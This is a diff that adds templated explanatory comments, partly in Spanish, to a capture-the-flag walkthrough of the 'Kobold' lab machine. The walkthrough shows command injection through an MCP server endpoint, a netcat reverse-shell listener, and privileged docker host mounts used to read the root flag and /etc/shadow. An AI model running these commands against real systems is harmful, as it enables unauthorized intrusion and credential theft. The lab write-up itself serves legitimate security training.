@@ -39,11 +39,15 @@ Privileged Container Mount → Root Flag
 
 ### Host Setup
 ```bash
+# What it does: adds machine domains to /etc/hosts.
+# Why here: resolve virtual hosts during web enumeration.
 echo "TARGET_IP kobold.htb mcp.kobold.htb bin.kobold.htb" | sudo tee -a /etc/hosts
 ```
 
 ### Nmap Scan
 ```bash
+# What it does: runs an Nmap scan with the specified ports/scripts/options.
+# Why here: identify exposed services and decide on the next enumeration.
 nmap -sC -sV -p- TARGET_IP
 ```
 
@@ -65,6 +69,8 @@ Accessing `https://kobold.htb/` revealed a contact page with an email address: *
 Discovered additional subdomains using gobuster:
 
 ```bash
+# What it does: brute-forces paths, parameters or virtual hosts with a wordlist.
+# Why here: descubrir endpoints ocultos que abren la siguiente fase.
 gobuster vhost -u https://kobold.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
   --append-domain -k
 ```
@@ -83,6 +89,8 @@ The `mcp.kobold.htb` subdomain hosts an MCP (Model Context Protocol) server with
 
 **Endpoint Analysis:**
 ```bash
+# What it does: sends an HTTP request with the chosen method, headers or body.
+# Why here: test or trigger the web behavior described in this step.
 curl -k https://mcp.kobold.htb/api/mcp/connect -X POST \
   -H "Content-Type: application/json" \
   -d '{"serverConfig":{"command":"id","args":[],"env":{}},"serverId":"test"}'
@@ -94,11 +102,15 @@ curl -k https://mcp.kobold.htb/api/mcp/connect -X POST \
 
 **1. Set up listener:**
 ```bash
+# What it does: opens or uses a TCP connection/listener.
+# Why here: receive shell, transfer data or check connectivity.
 nc -lvnp 4444
 ```
 
 **2. Craft malicious payload:**
 ```bash
+# What it does: sends an HTTP request with the chosen method, headers or body.
+# Why here: test or trigger the web behavior described in this step.
 curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
   -H "Content-Type: application/json" \
   -d '{
@@ -148,10 +160,14 @@ id
 # uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
 
 # Check sudo permissions
+# What it does: lists sudo privileges of the current or specified user.
+# Why here: encontrar comandos permitidos para escalar privilegios.
 sudo -l
 # No sudo access
 
 # Search for interesting files
+# What it does: searches the filesystem with the specified filters.
+# Why here: locate credentials, binaries, configs or writable paths.
 find / -type f -name "*.txt" -o -name "*.conf" -o -name "*.ini" 2>/dev/null | grep -v proc
 ```
 
@@ -160,6 +176,8 @@ find / -type f -name "*.txt" -o -name "*.conf" -o -name "*.ini" 2>/dev/null | gr
 Discovered `/privatebin-data/data` directory containing PrivateBin paste data. However, the paste IDs are required to access the content, and we don't have them yet.
 
 ```bash
+# What it does: lists directory contents.
+# Why here: verificar archivos, permisos o loot en la ruta actual.
 ls -la /privatebin-data/data/
 # Contains hashed directory names (paste IDs)
 ```
@@ -176,6 +194,8 @@ which docker
 # /usr/bin/docker
 
 # Test docker access
+# What it does: controla contenedores/imagenes Docker con las opciones indicadas.
+# Why here: enumerar o abusar acceso a contenedores en la cadena.
 docker images
 # permission denied while trying to connect to the Docker daemon socket
 ```
@@ -220,6 +240,8 @@ id
 
 **3. Run privileged container with host filesystem mount:**
 ```bash
+# What it does: controla contenedores/imagenes Docker con las opciones indicadas.
+# Why here: enumerar o abusar acceso a contenedores en la cadena.
 docker run --rm -it --privileged -v /:/hostfs --user root \
   --entrypoint sh privatebin/nginx-fpm-alpine:2.0.2
 ```
@@ -237,6 +259,8 @@ docker run --rm -it --privileged -v /:/hostfs --user root \
 Once inside the container:
 ```bash
 # Verify host mount
+# What it does: lists directory contents.
+# Why here: verificar archivos, permisos o loot en la ruta actual.
 ls /hostfs/
 # bin  boot  dev  etc  home  lib  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
 
@@ -245,6 +269,8 @@ ls /hostfs/root/
 # root.txt
 
 # Read root flag
+# What it does: displays a file in the terminal.
+# Why here: read configuration, credentials, proof or flags.
 cat /hostfs/root/root.txt
 ```
 
@@ -253,6 +279,8 @@ cat /hostfs/root/root.txt
 ## Root Flag
 
 ```bash
+# What it does: controla contenedores/imagenes Docker con las opciones indicadas.
+# Why here: enumerar o abusar acceso a contenedores en la cadena.
 docker run --rm -i --privileged -v /:/hostfs --user root \
   --entrypoint sh privatebin/nginx-fpm-alpine:2.0.2 \
   -c "cat /hostfs/root/root.txt"
@@ -268,6 +296,8 @@ docker run --rm -i --privileged -v /:/hostfs --user root \
 
 If docker is available with SUID bit:
 ```bash
+# What it does: controla contenedores/imagenes Docker con las opciones indicadas.
+# Why here: enumerar o abusar acceso a contenedores en la cadena.
 docker run -v /:/host -it alpine chroot /host /bin/bash
 ```
 
@@ -275,6 +305,8 @@ docker run -v /:/host -it alpine chroot /host /bin/bash
 
 If `/var/run/docker.sock` is accessible:
 ```bash
+# What it does: controla contenedores/imagenes Docker con las opciones indicadas.
+# Why here: enumerar o abusar acceso a contenedores en la cadena.
 docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/bash
 ```
 
@@ -305,6 +337,8 @@ docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bi
 
 ```bash
 # Test basic command execution
+# What it does: sends an HTTP request with the chosen method, headers or body.
+# Why here: test or trigger the web behavior described in this step.
 curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
   -H "Content-Type: application/json" \
   -d '{"serverConfig":{"command":"id","args":[],"env":{}},"serverId":"test"}'
@@ -330,8 +364,12 @@ groups
 newgrp docker
 
 # Mount host filesystem
+# What it does: controla contenedores/imagenes Docker con las opciones indicadas.
+# Why here: enumerar o abusar acceso a contenedores en la cadena.
 docker run --rm -it --privileged -v /:/hostfs --user root alpine /bin/bash
 
 # One-liner to read specific file
 docker run --rm -i --privileged -v /:/hostfs --user root alpine -c "cat /hostfs/etc/shadow"
 ```
+
+
